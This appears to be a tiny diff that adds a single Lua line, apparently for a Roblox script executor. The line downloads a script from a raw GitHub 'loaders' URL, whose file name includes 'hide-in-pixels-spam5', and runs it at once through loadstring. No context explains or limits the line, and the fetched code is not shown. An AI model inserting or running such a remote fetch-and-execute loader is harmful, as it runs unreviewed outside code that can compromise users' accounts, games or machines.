@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/hide-in-pixels-spam5-ig36nubfgoeu9c.lua"))()
